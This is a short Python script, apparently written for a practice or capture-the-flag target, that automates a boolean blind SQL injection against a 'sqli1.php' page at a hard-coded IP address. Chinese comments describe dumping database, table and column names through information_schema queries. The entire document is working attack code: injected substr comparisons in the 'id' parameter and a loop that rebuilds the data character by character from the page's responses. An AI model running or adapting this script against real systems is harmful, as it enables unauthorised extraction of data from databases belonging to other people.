#! -*- encoding:utf-8 -*-
# python3
# author: leticia
import requests

#用这里的语句分别替换id中的内容即可爆库、表、字段
#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'
#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'

dic = '0123456789abcdefghijklmnopqrstuvwxyz,'
url = "http://113.108.70.111:62043/sqli1.php?id=1\' and "
string=''
for i in range(1,100):
    for j in dic:
        id="substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),{0},1)={1}--+".format(str(i),ascii(j))
        #print(id)
        url_get=(url+id)
        #print(url_get)
        r=requests.get(url_get)
        if "admin" in r.text:
            string+=j
            print(string)
print(string)